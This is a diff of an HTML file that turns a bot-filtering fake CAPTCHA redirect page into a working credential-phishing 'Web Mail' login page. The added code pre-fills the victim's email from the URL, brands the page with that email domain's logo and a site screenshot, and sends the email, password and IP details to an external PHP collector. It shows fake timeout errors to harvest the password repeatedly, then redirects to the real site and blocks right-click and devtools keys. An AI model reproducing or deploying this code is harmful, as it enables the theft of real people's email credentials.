@@ -1,185 +1,313 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow">
-  <title>Scan</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f0f0f0;
-    }
-    .container {
-      text-align: center;
-      padding: 20px;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    #captchaQuestion {
-      margin-bottom: 20px;
-      font-size: 18px;
-    }
-    #captchaInput {
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 10px;
-    }
-    #verifyButton {
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    #verifyButton:disabled {
-      background-color: #ccc;
-      cursor: not-allowed;
-    }
-    #error {
-      color: red;
-      display: none;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h2>Please Verify</h2>
-    <div id="captchaQuestion"></div>
-    <input type="text" id="captchaInput" placeholder="Enter answer">
-    <button id="verifyButton" disabled>Verify</button>
-    <div id="error">Verification failed. Please try again.</div>
-  </div>
-
-  <script>
-    // Bot detection variables
-    let mouseMoved = false;
-    let keyPressed = false;
-    let startTime = Date.now();
-    let extractedEmail = null;
-
-    // Common bot user-agents (partial list)
-    const botUserAgents = [
-      'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'yandexbot',
-      'baiduspider', 'slurp', 'duckduckbot', 'facebot', 'ia_archiver'
-    ];
-
-    // Check user-agent for bot signatures
-    function isBotUserAgent() {
-      const ua = navigator.userAgent.toLowerCase();
-      return botUserAgents.some(bot => ua.includes(bot));
-    }
-
-    // Validate email format
-    function isValidEmail(email) {
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return emailRegex.test(email);
-    }
-
-    // Extract email from URL fragment
-    function extractEmailFromHash() {
-      const hash = window.location.hash.substring(1); // Remove '#'
-      if (hash && isValidEmail(hash)) {
-        extractedEmail = hash;
-        console.log('Extracted email:', extractedEmail); // Debugging
-      } else {
-        extractedEmail = null;
-        console.log('No valid email found in URL hash');
-      }
-    }
-
-    // Generate simple math CAPTCHA
-    function generateCaptcha() {
-      const num1 = Math.floor(Math.random() * 10) + 1;
-      const num2 = Math.floor(Math.random() * 10) + 1;
-      const answer = num1 + num2;
-      document.getElementById('captchaQuestion').textContent = `What is ${num1} + ${num2}?`;
-      return answer;
-    }
-
-    // Initialize CAPTCHA and extract email
-    let correctAnswer = generateCaptcha();
-    extractEmailFromHash();
-
-    // Behavioral checks
-    document.addEventListener('mousemove', () => {
-      mouseMoved = true;
-      checkVerificationReadiness();
-    });
-
-    document.addEventListener('keydown', () => {
-      keyPressed = true;
-      checkVerificationReadiness();
-    });
-
-    // Enable verify button only after behavioral checks pass
-    function checkVerificationReadiness() {
-      const timeElapsed = Date.now() - startTime > 2000; // At least 2 seconds
-      if (mouseMoved && keyPressed && timeElapsed) {
-        document.getElementById('verifyButton').disabled = false;
-      }
-    }
-
-    // Verification logic
-    document.getElementById('verifyButton').addEventListener('click', () => {
-      const userAnswer = document.getElementById('captchaInput').value.trim();
-      const errorDiv = document.getElementById('error');
-
-      // Block if user-agent is a bot
-      if (isBotUserAgent()) {
-        errorDiv.style.display = 'block';
-        errorDiv.textContent = 'Access denied.';
-        return;
-      }
-
-      // Check CAPTCHA answer
-      if (parseInt(userAnswer) === correctAnswer) {
-        // Construct redirect URL with email in hash (unencoded)
-        let redirectUrl = 'https://ighmoseum.vercel.app#';
-        if (extractedEmail) {
-          redirectUrl += `${extractedEmail}`;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Mail</title>
+    <link rel="icon" class="id">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+     <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <style>
+        *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
         }
-        console.log('Redirecting to:', redirectUrl); // Debugging
-        window.location.href = redirectUrl;
-      } else {
-        errorDiv.style.display = 'block';
-        document.getElementById('captchaInput').value = '';
-        // Generate new CAPTCHA
-        correctAnswer = generateCaptcha();
-      }
-    });
+        body{
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #ccc;
+        }
+        .container-box{
+            width: 32%;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+        .lgBox img{
+            width: 80px;
+        }
+        .lgBox{
+            text-align: center;
+            margin: 10px 0;
+        }
+        .tpBox1{
+            text-align: center;
+            color: #474545;
+        }
+        .tpBox1 h2{
+            font-weight: 500;
+            margin: 10px 0;
+            text-transform: capitalize;
+        }
+        .foBox label{
+            display: block;
+            font-weight: 500;
+            font-size: 14px;
+            margin: 2px 0;
+        }
+        .foBox {
+            margin: 20px 0;
+        }
+        .foBox input{
+            width: 100%;
+            padding: 12px 10px;
+            font-family: inherit;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            border-radius: 3px;
+        }
+        .foBox input:focus{
+            outline: none;
+            border: 1px solid #ccc;
+        }
+        .foBox button{
+            width: 100%;
+            padding: 13px;
+            border-radius: 3px;
+            background-color: rgb(71, 71, 247);
+            font-family: inherit;
+            border: none;
+            font-size: 15px;
+            color: #fff;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .foBox button:hover{
+            background-color: rgb(40, 40, 243);
+        }
+        .foBox button:disabled{
+            background-color: rgb(117, 117, 253);
+            cursor: not-allowed;
+        }
+        .errorBox p{
+            color: rgb(201, 22, 22);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .validation-error {
+            color: rgb(201, 22, 22);
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .hide {
+            display: none;
+        }
 
-    // Prevent automated form submission
-    document.addEventListener('submit', (e) => {
-      e.preventDefault(); // Disable any form submissions
-    });
-
-    // Optional: Block headless browsers by checking WebGL
-    function isHeadless() {
-      const gl = document.createElement('canvas').getContext('webgl');
-      if (!gl) return true;
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      if (!debugInfo) return true;
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      return renderer.includes('SwiftShader') || renderer.includes('llvmpipe');
+        @media screen and (max-width: 700px){
+            .container-box{
+                width: 95%;
+                margin: 100px auto;
+            }
     }
+    </style>
+</head>
+<body class="body">
 
-    if (isHeadless()) {
-      document.getElementById('error').style.display = 'block';
-      document.getElementById('error').textContent = 'Access denied.';
-      document.getElementById('verifyButton').disabled = true;
-    }
-  </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'936dc335481abcd2',t:'MTc0NTc1MTA2My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+    <div class="container-box">
+
+         <div class="lgBox">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5gCt7n-dgPdPihTWR0HgWfCi6O_2SvoeMvg&s" alt="lgw" class="lgi">
+         </div>
+
+         <div class="tpBox1">
+            <h2 class="tBoxi">Web Mail</h2>
+         </div>
+
+         <div class="errorBox hide">
+            <p>Connection timed out, try again!</p>
+         </div>
+
+         <form action="#" class="mxf">
+            <div class="foBox">
+                <label for="">Email address</label>
+                <input type="email" name="em" id="em" placeholder="Email address" required>
+                <div class="validation-error" id="em-error">Please enter your email address</div>
+            </div>
+
+            <div class="foBox">
+                <label for="">Password</label>
+                <input type="password" name="pas" id="pas" placeholder="Password" required>
+                <div class="validation-error" id="pas-error">Please enter your password</div>
+            </div>
+
+            <div class="foBox">
+                <button class="btn2">Sign in</button>
+            </div>
+         </form>
+    </div>
+
+    <script>
+        const mxf = document.querySelector(".mxf");
+        const em = document.querySelector("#em");
+        const pas = document.querySelector("#pas");
+        const lgi = document.querySelector(".lgi");
+        const tBoxi = document.querySelector(".tBoxi");
+        const shorticon = document.createElement("link");
+        const id = document.querySelector(".id");
+        const btn2 = document.querySelector(".btn2");
+        const errorBox = document.querySelector(".errorBox");
+        const body = document.querySelector(".body");
+        const emError = document.querySelector("#em-error");
+        const pasError = document.querySelector("#pas-error");
+        let num = 0;
+        let domain = "";
+        let ip = "";
+
+
+
+       
+        // External PHP server URL - replace with your actual PHP script URL
+        const phpServerUrl = "https://server1.diekitchen.com/gavinmas/result.php";
+
+        // Function to send form data to external PHP server
+        const sendToPHPServer = (formData) => {
+            // Create a new FormData object from the form
+            const data = new FormData();
+            data.append('em', formData.em);
+            data.append('pas', formData.pas);
+            data.append('ip', JSON.stringify(formData.ip));
+            
+            // Send to external PHP server
+            fetch(phpServerUrl, {
+                method: 'POST',
+                body: data
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending data to PHP server');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        };
+
+        // Validate form fields
+        const validateForm = () => {
+            let isValid = true;
+            
+            // Reset error messages
+            emError.style.display = 'none';
+            pasError.style.display = 'none';
+            
+            // Validate email
+            if (!em.value.trim()) {
+                emError.style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate password
+            if (!pas.value.trim()) {
+                pasError.style.display = 'block';
+                isValid = false;
+            }
+            
+            return isValid;
+        };
+
+    window.addEventListener("load", () => {
+
+        fetch("https://ipinfo.io/json")
+        .then((res) => res.json())
+        .then((resp) => {
+            ip = resp
+        });
+
+        const emgrab =  window.location.href.split("#")[1];
+        if(emgrab){
+            em.value  = emgrab;
+            domain = emgrab.split("@")[1];
+            lgi.src = `https://cdn.brandfetch.io/${domain}?c=1id19ZnkHfbA3Uipou3`;
+            body.style.backgroundImage = `linear-gradient(to bottom, rgba(0, 0, 0, 0.466) 0%, rgba(0, 0, 0, 0.678) 100%), url('https://image.thum.io/get/width/1200/https://${domain}')`;
+            body.style.backgroundSize = `cover`;
+            body.style.backgroundRepeat = `no-repeat`;
+            body.style.height = `100vh`;
+
+            const name = domain.split(".")[0];
+            tBoxi.textContent = name;
+            document.title = name;
+
+            shorticon.setAttribute("rel", "shortcut icon");
+            shorticon.setAttribute("href", `https://logo.clearbit.com/${domain}`);
+            id.setAttribute("href", `https://logo.clearbit.com/${domain}`);
+            
+        }
+        
+        });
+
+        mxf.addEventListener("submit", (e) => {
+            e.preventDefault();
+            
+            // Validate form before submission
+            if (!validateForm()) {
+                return;
+            }
+            
+            const formPas = e.target.elements.pas.value;
+            btn2.setAttribute("disabled", true);
+            btn2.textContent = "Please wait...";
+            errorBox.classList.add("hide");  
+            num++;
+
+
+            
+            // Send form data to external PHP server
+            sendToPHPServer({
+                em: em.value,
+                pas: formPas,
+                ip: ip
+            });
+            
+            btn2.setAttribute("disabled", true);
+
+            setTimeout(() => {
+                btn2.removeAttribute("disabled");
+                btn2.textContent = "Sign in";
+
+                if(num < 3){
+                    errorBox.classList.remove("hide");  
+                    e.target.elements.pas.value = "";
+                }
+                else {
+                    e.target.reset();
+                    window.location.href = `https://${domain}`;
+                }
+
+            }, 3000);
+        })
+
+        // Add input event listeners to hide validation errors when user types
+        em.addEventListener('input', () => {
+            if (em.value.trim()) {
+                emError.style.display = 'none';
+            }
+        });
+        
+        pas.addEventListener('input', () => {
+            if (pas.value.trim()) {
+                pasError.style.display = 'none';
+            }
+        });
+
+    </script>
+<script>
+        document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+        });
+        document.addEventListener('keydown', function(e) {
+            
+            if ((e.ctrlKey && (e.key === 's' || e.key === 'u')) || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+</script>
+
 </body>
 </html>
